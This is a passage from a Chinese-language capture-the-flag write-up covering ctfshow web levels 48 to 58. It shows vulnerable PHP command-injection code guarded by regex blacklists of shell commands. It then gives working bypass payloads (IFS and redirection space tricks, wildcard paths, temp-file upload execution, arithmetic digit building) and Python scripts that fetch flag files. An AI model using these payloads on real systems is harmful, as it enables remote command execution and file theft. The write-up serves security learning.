class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match</span><br><span class="line">       (<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤了一大堆，没过滤tac，继续使用上把的payload</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac%09fla?.php||</span><br></pre></td></tr></table></figure><p>​       </p><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">按理说过滤了% 但是%<span class="number">09</span>还能用，所以上一把payload</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=tac%09fla?.php||  //按理说不应该执行成功</span><br><span class="line"></span><br><span class="line">我们使用重定向符号&lt; 或&lt;&gt;绕过空格：</span><br><span class="line">?c=tac&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br><span class="line">?c=tac&lt;&gt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br></pre></td></tr></table></figure><p>​         </p><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">还是没有过滤tac，使用上把payload</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=tac&lt;&gt;fla\g.php|| //不知道为什么&lt;&gt;和?一起用不显示,使用\和<span class="string">&#x27;&#x27;</span>也可以</span><br><span class="line">?c=tac&lt;&gt;fla<span class="string">&#x27;&#x27;</span>g.php|| </span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">这次对tac进行了过滤，我们可以用\或<span class="string">&#x27;&#x27;</span>分割进行绕过</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=ta\c&lt;&gt;fla\g.php||</span><br><span class="line">?c=ta<span class="string">&#x27;&#x27;</span>c&lt;&gt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤了尖括号，但是放开了$和&#123; &#125;，我们用这个绕过空格</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ta\c<span class="variable">$&#123;IFS&#125;</span>fla\g.ph\p||</span><br></pre></td></tr></table></figure><p>但是得到的不是flag，应该不在这个路径下了</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web52-0.png"></p><p>使用命令查找上级目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当前目录：/var/www/html</span><br><span class="line">?c=ls$&#123;IFS&#125;../||          #上一级目录 www</span><br><span class="line">?c=ls$&#123;IFS&#125;../../||       #上两级目录 var</span><br><span class="line">?c=ls$&#123;IFS&#125;../../../||    #根目录 /</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web52-1.png"></p><p>发现在根目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ta\c<span class="variable">$&#123;IFS&#125;</span>../../../fla\g||</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web52-2.png"></p><p>​        </p><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤还是老样子，命令执行后直接输出，使用了拼接“<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;”在输出前连接了&lt;br&gt;,表示换行，不影响，且使命令结果不显示的代码“&gt;/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>”被去掉了，所以我们去掉||即可</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=tac<span class="variable">$&#123;IFS&#125;</span>fla\g.p\hp</span><br><span class="line">?c=ca\t<span class="variable">$&#123;IFS&#125;</span>fla\g.p\hp   <span class="comment">#cat居然能用了</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web53.png"></p><p>​      </p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">这次过滤了好多字母，|.*c.*a.*t.*|的意思是cat和cat之间插入字符都被过滤了,所以也不能会用\的形式进行分割，但还有另一个读取的命令grep可以使用</span><br><span class="line">    grep：在当前目录中，查找后缀有file字样的文件中包含test字符串的文件，并打印出该字符串的行。此时，可以使用这个命令 grep test *file</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=grep<span class="variable">$&#123;IFS&#125;</span>fl<span class="variable">$&#123;IFS&#125;</span>fla?.php</span><br><span class="line">?c=/bin/?at<span class="variable">$&#123;IFS&#125;</span>f??????? <span class="comment">#cat命令在/bin目录下</span></span><br><span class="line">?c=/bin/?at<span class="variable">$&#123;IFS&#125;</span>/var/www/html/fla?.php <span class="comment">#不知道为什么不行</span></span><br><span class="line">?c=uniq<span class="variable">$&#123;IFS&#125;</span>f???.php <span class="comment">#执行后右键查看源代码即可</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web54.png"></p><p>​      </p><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">这次把字母都给禁掉了，一般遇到这情况最容易想到的应该是进行异或运算等等办法进行构造，在这里他没有禁掉数字，我们有其他略微方便点的方法，就是通过匹配bin下存在的命令进行读取flag</span><br><span class="line">bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、<span class="built_in">kill</span>、ls、mkdir、more、mount、rm、su、tar、base64等。</span><br><span class="line">我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls</span><br></pre></td></tr></table></figure><p>这里没有禁用数字所以我们可以使用base64命令，构造如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64 ????.???     也就是?c=/bin/base64 flag.php</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web55.py</span></span><br><span class="line"><span class="comment"># time: 2023/4/12 23:59</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7e0f495d-f8ad-4fea-a4e8-56f3864e7202.challenge.ctf.show/&quot;</span></span><br><span class="line">shell_url = url+<span class="string">&quot;?c=/???/????64 ????.???&quot;</span></span><br><span class="line">res = requests.get(url=shell_url)</span><br><span class="line">flag = re.search(<span class="string">&quot;(ctfshow&#123;.*&#125;)&quot;</span>,<span class="built_in">bytes</span>.decode(base64.b64decode(res.text)))</span><br><span class="line">flag = flag.group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web55.png"></p><p>可以参考一些文章：<br> [P神 -无字母数字webshell之提高篇 _ 离别歌 ](离线网页\无字母数字webshell之提高篇 _ 离别歌 (2023_4_13 00_06_04).html) </p><p>[无字母数字的命令执行](离线网页\无字母数字的命令执行(ctfshow web入门 55）_无字幕命令执行 ctf_Firebasky的博客-CSDN博客 (2023_4_13 00_18_32).html) </p><p>​      </p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤了字母和数字，所以我们不能使用上一关的payload了</span><br></pre></td></tr></table></figure><p>根据P神的一篇无字母数字webshell的文章，这里我们可以利用php的特性：如果我们发送一个上传文件的post包，php会将我们上传的文件保存在临时的文件夹下，并且默认的文件目录是/tmp/phpxxxxxx。文件名最后的6个字符是随机的大小写字母，而且最后一个字符大概率是大写字母，但不一定是，可能需要多匹配几次。容易想到的匹配方式就是利用<code>？</code>进行匹配，即<code>???/?????????</code>，然而这不一定会匹配到我们上传的文件，这时候有什么办法呢？</p><p>观察ASCII码表我们发现在大写A之前是<code>@</code>符号，Z后是<code>[</code>符号，所以我们可以这样匹配<code>???/????????[@-[]</code>，想不到通配符还可以这样用吧，<code>[^0-9]</code>表示该位置不是数字，是不是和正则那一套一样样的<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web56-0.png"></p><p>那么我们应该如何执行我们上传的文件呢?P神文章中指出可以使用<code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令，而且用<code>. file</code>执行文件，是不需要file有x权限的。所以思路就是我们可以上传一个文件<code>test.txt</code>，文件中写着我们要执行的命令<code>ls</code>，最后使用<code>. test.txt</code>执行就可以了</p><p>根据南神的文章写一个脚本，可能需要多运行几次，因为最后一位不一定是大写字母，所以多上传几次多匹配几次才可能成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web56.py</span></span><br><span class="line"><span class="comment"># time: 2023/4/13 0:22</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">    url = <span class="string">&quot;http://f3e9fa35-35fa-4ea2-af99-fe6e55f592f7.challenge.ctf.show/?c=. /???/????????[@-[]&quot;</span></span><br><span class="line">    res = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;cat flag.php&quot;</span>)&#125;)<span class="comment">#post一个文件上去</span></span><br><span class="line">    flag = re.search(<span class="string">&quot;(ctfshow&#123;.*?&#125;)&quot;</span>, res.text)</span><br><span class="line">    flag = flag.group()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt;<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        </span><br><span class="line">----------------------------------------------------------------------------------------------------</span><br><span class="line">南神代码：</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://f3e9fa35-35fa-4ea2-af99-fe6e55f592f7.challenge.ctf.show/?c=. /???/????????[@-[]&quot;</span></span><br><span class="line">    res = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;dota.txt&quot;</span>, <span class="string">&quot;cat flag.php&quot;</span>)&#125;)</span><br><span class="line">    flag = res.text.split(<span class="string">&#x27;ctfshow&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt;<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web56-1.png"></p><p>​      </p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤数字和字母，使用system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>)执行，而且已经给了cat和.php，我们只需要构造出<span class="number">36</span>就可以了，在shell中可以利用$和()进行构造数字</span><br></pre></td></tr></table></figure><blockquote><p><code>$(())</code> 代表做一次运算，因为里面为空，也表示值为0<br> <code>$((~$(())))</code> 对0作取反运算，值为-1<br> <code>$(($((~$(())))$((~$(())))))</code> -1-1，也就是(-1)+(-1)为-2，所以值为-2<br> <code>$((~$(($((~$(())))$((~$(())))))))</code> 再对-2做一次取反得到1，所以值为1</p><p>如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到-1</p></blockquote><p>我们只要构造出-37然后取反就可以得到36</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&quot;$((~$((&quot;</span>+<span class="string">&quot;$((~$(())))&quot;</span>*<span class="number">37</span>+<span class="string">&quot;))))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web57.png"></p><p>因为是cat，查看源码</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web57-2.png"></p><p>​        </p><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">没有过滤，但是参数传递很奇怪，可以直接使用蚁剑连接，但是应该考察文件读取</span><br></pre></td></tr></table></figure><p>一些文件读取函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="variable">$filename</span>);</span><br><span class="line">show_source(<span class="variable">$filename</span>);</span><br><span class="line">print_r(php_strip_whitespace(<span class="variable">$filename</span>));</span><br><span class="line">print_r(file_get_contents(<span class="variable">$filename</span>));</span><br><span class="line">readfile(<span class="variable">$filename</span>);</span><br><span class="line">print_r(file(<span class="variable">$filename</span>)); <span class="comment">// 